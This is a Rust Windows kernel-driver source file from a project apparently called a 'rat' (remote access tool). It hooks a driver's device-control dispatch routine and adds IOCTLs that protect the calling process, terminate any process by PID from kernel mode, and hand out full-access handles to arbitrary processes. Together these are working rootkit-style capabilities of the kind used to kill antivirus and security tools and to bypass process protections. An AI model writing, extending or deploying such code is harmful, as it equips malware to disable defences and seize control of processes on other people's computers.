use core::sync::atomic::{AtomicPtr, Ordering};
use core::{mem, ptr, slice};

use rat_common::utils::DropGuard;
use rat_common::windows::{IOCTL_OPEN_PROCESS, IOCTL_START_DEFENSE, IOCTL_TERMINATE};
use wdk::nt_success;
use wdk_sys::ntddk::{
    IoCreateDevice, IoCreateSymbolicLink, IoGetCurrentProcess, IofCompleteRequest,
    PsGetCurrentProcessId, RtlInitUnicodeString, ZwClose, ZwTerminateProcess,
};
use wdk_sys::{
    DEVICE_OBJECT, DO_BUFFERED_IO, DO_DEVICE_INITIALIZING, FILE_DEVICE_SECURE_OPEN,
    FILE_DEVICE_UNKNOWN, HANDLE, IO_NO_INCREMENT, IO_STACK_LOCATION, IRP, IRP_MJ_DEVICE_CONTROL,
    NTSTATUS, OBJ_KERNEL_HANDLE, PDEVICE_OBJECT, PDRIVER_OBJECT, PIRP, STATUS_INVALID_PARAMETER,
    STATUS_SUCCESS, STATUS_UNSUCCESSFUL, UNICODE_STRING,
};

use crate::global::{DEVICE_NAME, DOS_NAME};
use crate::initialize::cleanup::cleanup_device;
use crate::state::DRIVER_STATE;
use crate::utils::{match_process_name, open_process_full_access};
use crate::wrappers::bindings::IoGetCurrentIrpStackLocation;
use crate::{error, info, warn};

type IrpHandler = unsafe extern "C" fn(PDEVICE_OBJECT, PIRP) -> NTSTATUS;

static _OLD_DEVICE_CONTROL_HANDLER: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());

struct _CleanupOnDrop {
    pub device: PDEVICE_OBJECT,
}

impl Drop for _CleanupOnDrop {
    fn drop(&mut self) {
        cleanup_device(self.device);
    }
}

pub fn create_device(driver: PDRIVER_OBJECT) -> anyhow::Result<PDEVICE_OBJECT, NTSTATUS> {
    match unsafe { driver.as_mut() } {
        Some(driver) => {
            if let Some(handler) = driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] {
                _OLD_DEVICE_CONTROL_HANDLER.store(handler as *mut u8, Ordering::Release);
            }

            driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] = Some(device_control_handler);
        }
        None => {
            error!("A null pointer is provided to create_device");
            return Err(STATUS_INVALID_PARAMETER);
        }
    }

    let mut dos_name = UNICODE_STRING::default();
    let mut device_name = UNICODE_STRING::default();
    unsafe {
        RtlInitUnicodeString(&mut dos_name, DOS_NAME.as_ptr());
        RtlInitUnicodeString(&mut device_name, DEVICE_NAME.as_ptr());
    }

    let mut device = ptr::null_mut();
    let status = unsafe {
        IoCreateDevice(
            driver,
            0,
            &mut device_name,
            FILE_DEVICE_UNKNOWN,
            FILE_DEVICE_SECURE_OPEN,
            0,
            &mut device,
        )
    };
    if !nt_success(status) {
        error!("IoCreateDevice error: 0x{status:X}");
        return Err(status);
    }

    let mut guard = _CleanupOnDrop { device };

    if let Some(device) = unsafe { device.as_mut() } {
        device.Flags |= DO_BUFFERED_IO;
        device.Flags &= !DO_DEVICE_INITIALIZING;
    }

    let status = unsafe { IoCreateSymbolicLink(&mut dos_name, &mut device_name) };
    if !nt_success(status) {
        error!("IoCreateSymbolicLink error: 0x{status:X}");
        return Err(status);
    }

    guard.device = ptr::null_mut(); // Prevent cleanup on drop
    Ok(device)
}

unsafe extern "C" fn device_control_handler(device: PDEVICE_OBJECT, irp: PIRP) -> NTSTATUS {
    let state = DRIVER_STATE.load(Ordering::Acquire);
    if let Some(state) = unsafe { state.as_ref() }
        && state.device_object() == device
    {
        let device = match unsafe { device.as_ref() } {
            Some(d) => d,
            None => {
                warn!("irp_handler: PDEVICE_OBJECT is null");
                return STATUS_INVALID_PARAMETER;
            }
        };

        let irp = match unsafe { irp.as_mut() } {
            Some(i) => i,
            None => {
                warn!("irp_handler: PIRP is null");
                return STATUS_INVALID_PARAMETER;
            }
        };

        let irpsp = match unsafe { IoGetCurrentIrpStackLocation(irp).as_mut() } {
            Some(s) => s,
            None => {
                warn!("irp_handler: Failed to call IoGetCurrentIrpStackLocation");
                return STATUS_INVALID_PARAMETER;
            }
        };

        // Handle our custom IOCTLs here
        let status = device_control_notify(device, irp, irpsp);
        irp.IoStatus.__bindgen_anon_1.Status = status;
        unsafe {
            IofCompleteRequest(irp, IO_NO_INCREMENT as i8);
        }
        status
    } else {
        let old_handler = _OLD_DEVICE_CONTROL_HANDLER.load(Ordering::Acquire);
        if old_handler.is_null() {
            return STATUS_UNSUCCESSFUL;
        }

        unsafe {
            let handler = mem::transmute::<*mut u8, IrpHandler>(old_handler);
            handler(device, irp)
        }
    }
}

fn device_control_notify(
    _: &DEVICE_OBJECT,
    irp: &mut IRP,
    irpsp: &mut IO_STACK_LOCATION,
) -> NTSTATUS {
    let process = unsafe { IoGetCurrentProcess() };
    let state = DRIVER_STATE.load(Ordering::Acquire);
    match unsafe { state.as_ref() } {
        Some(state) => {
            if !match_process_name(process, state.protected_process_ac()) {
                return STATUS_UNSUCCESSFUL;
            }

            match unsafe { irpsp.Parameters.DeviceIoControl.IoControlCode } {
                IOCTL_START_DEFENSE => {
                    let pid = unsafe { PsGetCurrentProcessId() };

                    let protected_pids = state.protected_pids();
                    match unsafe { protected_pids.as_ref() } {
                        Some(lock) => {
                            info!("Activating self-defense for process {}", pid as usize);
                            let mut guard = lock.write();
                            guard.insert(pid);

                            STATUS_SUCCESS
                        }
                        None => {
                            error!("Cannot activate self-defense for process {}", pid as usize);
                            STATUS_UNSUCCESSFUL
                        }
                    }
                }
                IOCTL_TERMINATE => {
                    let buffer = unsafe {
                        slice::from_raw_parts(
                            irp.AssociatedIrp.SystemBuffer.cast::<u8>(),
                            irpsp.Parameters.DeviceIoControl.InputBufferLength as usize,
                        )
                    };

                    let buffer = match buffer.try_into() {
                        Ok(b) => b,
                        Err(_) => {
                            return STATUS_INVALID_PARAMETER;
                        }
                    };

                    let pid = usize::from_le_bytes(buffer);
                    match open_process_full_access(pid as HANDLE, OBJ_KERNEL_HANDLE) {
                        Ok(process) => {
                            let guard = DropGuard::new(process, |h| unsafe {
                                let _ = ZwClose(h);
                            });

                            let status = unsafe { ZwTerminateProcess(process, 0) };

                            drop(guard);
                            status
                        }
                        Err(status) => status,
                    }
                }
                IOCTL_OPEN_PROCESS => {
                    let buffer = unsafe {
                        slice::from_raw_parts_mut(
                            irp.AssociatedIrp.SystemBuffer.cast::<u8>(),
                            irpsp.Parameters.DeviceIoControl.InputBufferLength as usize,
                        )
                    };

                    let input = match buffer.try_into() {
                        Ok(b) => b,
                        Err(_) => {
                            return STATUS_INVALID_PARAMETER;
                        }
                    };

                    let pid = usize::from_le_bytes(input);
                    match open_process_full_access(pid as HANDLE, 0) {
                        Ok(handle) => {
                            let handle = handle as usize;
                            buffer.copy_from_slice(&handle.to_le_bytes());
                            irp.IoStatus.Information = size_of::<usize>() as u64;

                            STATUS_SUCCESS
                        }
                        Err(status) => status,
                    }
                }
                code => {
                    error!("Unknown IOCTL code: 0x{code:X}");
                    STATUS_INVALID_PARAMETER
                }
            }
        }
        None => {
            error!("DRIVER_STATE is uninitialized");
            STATUS_UNSUCCESSFUL
        }
    }
}
